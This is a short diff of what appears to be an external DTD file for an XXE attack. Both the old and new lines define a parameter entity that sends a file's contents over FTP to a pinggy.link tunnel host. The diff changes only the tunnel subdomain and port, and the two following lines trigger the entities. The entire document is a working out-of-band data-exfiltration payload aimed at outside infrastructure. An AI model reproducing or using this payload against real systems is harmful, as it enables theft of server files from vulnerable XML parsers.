@@ -1,3 +1,3 @@
-<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'ftp://%file;@obfyz-49-206-99-72.a.free.pinggy.link:42933/'>">
+<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'ftp://%file;@bsmui-49-206-99-72.a.free.pinggy.link:33111/'>">
 %stack;
 %exfil;
